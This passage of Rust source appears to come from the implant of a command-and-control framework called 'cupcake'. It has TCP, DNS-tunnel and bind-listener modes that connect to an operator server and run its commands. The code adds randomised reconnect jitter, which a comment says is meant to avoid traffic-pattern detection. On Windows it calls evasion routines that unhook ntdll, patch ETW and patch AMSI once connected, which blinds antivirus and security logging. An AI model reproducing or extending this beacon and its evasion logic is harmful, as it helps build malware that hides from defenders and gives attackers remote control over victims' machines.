    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }

    let tcp_url = format!("tcp://{}", clean_url);

    let mut transport: Box<dyn Transport> = match create_transport(&tcp_url) {
        Ok(t) => t,
        Err(e) => {
            return Err(e);
        }
    };

    // 使用指数退避重连策略(same as WS 模式一致）
    let mut backoff = cupcake_core::ExponentialBackoff::new();

    loop {
        if let Err(_) = transport.connect().await {
            let delay = backoff.next_delay();
            // 添加抖动避免流量模式识别
            let jitter_ms = cupcake_core::utils::random_range(0, 3000) as u64;
            tokio::time::sleep(delay + tokio::time::Duration::from_millis(jitter_ms)).await;
            continue;
        }

        // 连接成功：重置退避
        backoff.reset();

        // EVASION: same post-connect patch policy as WebSocket mode.
        #[cfg(target_os = "windows")]
        {
            cupcake_core::stealth::post_connect_patch_delay().await;
            if !stealth::is_degraded() {
                #[cfg(feature = "ntdll-unhook")]
                unsafe {
                    let _ = stealth::unhook_ntdll();
                }
                stealth::small_jitter_sleep();
                #[cfg(feature = "etw-patch")]
                unsafe {
                    stealth::patch_etw();
                }
                stealth::small_jitter_sleep();
                #[cfg(feature = "amsi-patch")]
                unsafe {
                    stealth::patch_amsi();
                }
                stealth::medium_jitter_sleep();
            }
        }

        let handler = MessageHandler::new(transport);

        match handler.run().await {
            Ok(returned_transport) => {
                cupcake_core::module_supervisor::supervisor().stop_all();
                transport = returned_transport;
            }
            Err(_) => {
                cupcake_core::module_supervisor::supervisor().stop_all();
                loop {
                    match create_transport(&tcp_url) {
                        Ok(t) => {
                            transport = t;
                            break;
                        }
                        Err(_) => {
                            let delay = backoff.next_delay();
                            tokio::time::sleep(delay).await;
                        }
                    }
                }
            }
        }

        // Reconnect jitter 3–12s (was fixed 5s)
        let reconnect_ms = cupcake_core::utils::random_range(3000, 12000) as u64;
        tokio::time::sleep(tokio::time::Duration::from_millis(reconnect_ms)).await;
    }
}

/// DNS 模式运行逻辑
#[cfg(feature = "dns")]
#[allow(dead_code)]
async fn run_dns_mode() -> Result<()> {
    use cupcake_core::config::get_server_url;
    use cupcake_core::handler::MessageHandler;
    use cupcake_core::transport::{create_transport, Transport};

    let server_url = get_server_url();

    let mut clean_url = server_url.clone();

    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("dns://") {
        clean_url = clean_url.replace("dns://", "");
    }

    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }

    let dns_url = format!("dns://{}", clean_url);

    let mut transport: Box<dyn Transport> = match create_transport(&dns_url) {
        Ok(t) => t,
        Err(e) => return Err(e),
    };

    loop {
        if let Err(_) = transport.connect().await {
            let d = cupcake_core::backoff::apply_delay_jitter(
                std::time::Duration::from_secs(30),
                35,
            );
            tokio::time::sleep(tokio::time::Duration::from_millis(d.as_millis() as u64)).await;
            continue;
        }

        let handler = MessageHandler::new(transport);

        match handler.run().await {
            Ok(returned_transport) => {
                cupcake_core::module_supervisor::supervisor().stop_all();
                transport = returned_transport;
            }
            Err(_) => {
                cupcake_core::module_supervisor::supervisor().stop_all();
                loop {
                    match create_transport(&dns_url) {
                        Ok(t) => {
                            transport = t;
                            break;
                        }
                        Err(_) => {
                            let d = cupcake_core::backoff::apply_delay_jitter(
                                std::time::Duration::from_secs(60),
                                35,
                            );
                            tokio::time::sleep(
                                tokio::time::Duration::from_millis(d.as_millis() as u64),
                            )
                            .await;
                        }
                    }
                }
            }
        }

        let d = cupcake_core::backoff::apply_delay_jitter(
            std::time::Duration::from_secs(10),
            30,
        );
        tokio::time::sleep(tokio::time::Duration::from_millis(d.as_millis() as u64)).await;
    }
}
/// TCP Bind (正向监听) 模式运行逻辑
#[cfg(feature = "tcp_bind")]
async fn run_bind_mode() -> Result<()> {
    use cupcake_core::config::get_server_url;
    use cupcake_core::handler::MessageHandler;
    use cupcake_core::transport::{create_transport, Transport};

    let bind_addr = get_server_url();
    let mut clean_url = bind_addr.clone();

    // 清除一切可能的前缀
    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("tcp://") {
        clean_url = clean_url.replace("tcp://", "");
    } else if clean_url.starts_with("bind://") {
        clean_url = clean_url.replace("bind://", "");
    }

    // 清除路径部分 (e.g. /ws)
    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }

    // Preserve the configured bind host. Default to loopback when only a port
    // is given; explicit 0.0.0.0 must be chosen by the operator so bind mode
    // does not silently expose a control listener on every interface.
    let (host, port) = if let Some(idx) = clean_url.rfind(':') {
        let h = &clean_url[..idx];
        let p = &clean_url[idx + 1..];
        if h.is_empty() {
            ("127.0.0.1", p)
        } else {
            (h, p)
        }
    } else {
        ("127.0.0.1", clean_url.as_str())
    };
    let bind_url = format!("bind://{}:{}", host, port);

    let mut transport: Box<dyn Transport> = create_transport(&bind_url)?;

    loop {
        if let Err(_) = transport.connect().await {
            tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
            continue;
        }

        let handler = MessageHandler::new(transport);
        match handler.run().await {
            Ok(returned_transport) => {
                cupcake_core::module_supervisor::supervisor().stop_all();
                transport = returned_transport;
            }
            Err(_) => {
                cupcake_core::module_supervisor::supervisor().stop_all();
                transport = create_transport(&bind_url)?;
            }
        }
    }
}
